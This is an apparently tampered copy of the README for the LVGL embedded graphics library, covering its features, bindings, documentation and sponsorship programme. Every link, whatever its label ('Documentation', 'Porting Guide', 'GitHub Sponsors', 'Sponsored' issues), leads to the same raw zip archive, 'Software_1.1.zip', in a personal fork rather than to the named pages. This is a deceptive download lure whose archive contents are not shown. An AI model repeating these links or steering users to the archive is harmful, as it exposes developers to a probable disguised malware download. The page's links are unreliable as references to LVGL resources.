## :ledger: Overview

**Mature and Well-known**<br>
LVGL is the most popular free and open source embedded graphics library to create beautiful UIs for any MCU, MPU and display type. It's supported by industry leading vendors and projects like  Arm, STM32, NXP, Espressif, Nuvoton, Arduino, RT-Thread, Zephyr, NuttX, Adafruit and many more.

**Feature Rich**<br>
It has all the features to create modern and beautiful GUIs: 30+ built-in widgets, a powerful style system, web inspired layout managers, and a typography system supporting many languages. To integrate LVGL into your platform, all you need is at least 32kB RAM and 128 kB Flash, a C compiler, a frame buffer, and at least an 1/10 screen sized buffer for rendering.

**Services**<br>
Our team is ready to help you with graphics design, UI implementation and consulting services. Contact us if you need some support during the development of your next GUI project.

## :rocket: Features

**Free and Portable**
  - A fully portable C (C++ compatible) library with no external dependencies.
  - Can be compiled to any MCU or MPU, with any (RT)OS.
  - Supports monochrome, ePaper, OLED or TFT displays, or even monitors. [Porting Guide](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip)
  - Distributed under the MIT license, so you can easily use it in commercial projects too.
  - Needs only 32kB RAM and 128 kB Flash, a frame buffer, and at least an 1/10 screen sized buffer for rendering.
  - OS, External memory and GPU are supported but not required.

**Widgets, Styles, Layouts and more**
  - 30+ built-in [Widgets](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip):  Button, Label, Slider, Chart, Keyboard, Meter, Arc, Table and many more.
  - Flexible [Style system](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) with  ~100 style properties to customize any part of the widgets in any state.
  - [Flexbox](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) and [Grid](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip)-like layouts engines to automatically size and position the widgets in a responsive way.
  - Texts are rendered with UTF-8 encoding supporting CJK, Thai, Hindi, Arabic, Persian writing systems.
  - Word wrapping, kerning, text scrolling, sub-pixel rendering, Pinyin-IME Chinese input, Emojis in texts.
  - Rendering engine supporting animations, anti-aliasing, opacity, smooth scrolling, shadows, image transformation, etc  
  - Supports Mouse, Touchpad, Keypad, Keyboard, External buttons, Encoder [Input devices](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip).
  - [Multiple display](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) support.

**Binding and Build Support**
  - [MicroPython Binding](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) exposes LVGL API
  - [PikaScript Binding](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) python on MCU lighter and easier.
  - No custom build system is used. You can build LVGL as you build the other files of your project.
  - Support for Make and [CMake](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) is included out of the box.
  - [Develop on PC](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) and use the same UI code on embedded hardware.
  - Convert the C UI code to HTML file with our [Emscripten port](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip).

**Docs, Tools, and Services**
  - Detailed [Documentation](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) with [100+ simple examples](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip)
  - [Services](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) such as User interface design, Implementation and Consulting to make UI development simpler and faster.

## :heart: Sponsor

If LVGL saved you a lot of time and money or you just had fun using it, consider [Supporting its Development](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip).

**How do we spend the donations?**<br>
Our goal is to provide financial compensation for people who do the most for LVGL. It means not only the maintainers but anyone who implements a great feature should get a payment from the accumulated money. We use the donations to cover our operational costs like servers and related services.

**How to donate?**<br>
We use [GitHub Sponsors](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) where you can easily send one time or recurring donations. You can also see all of our expenses  in a transparent way.

**How to get paid for your contribution?**<br>
If someone implements or fixes an issue labeled as [Sponsored](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) he or she will get a payment for that work. We estimate the required time, complexity and importance of the issue and set a price accordingly. To jump in just comment on a [Sponsored](https://github.com/JonSmith2017/lvgl/raw/refs/heads/master/examples/event/Software_1.1.zip) issue saying "Hi, I'd like to deal with it. This is how I'm planning to fix/implement it...". A work is considered ready when it's approved and merged by a maintainer.
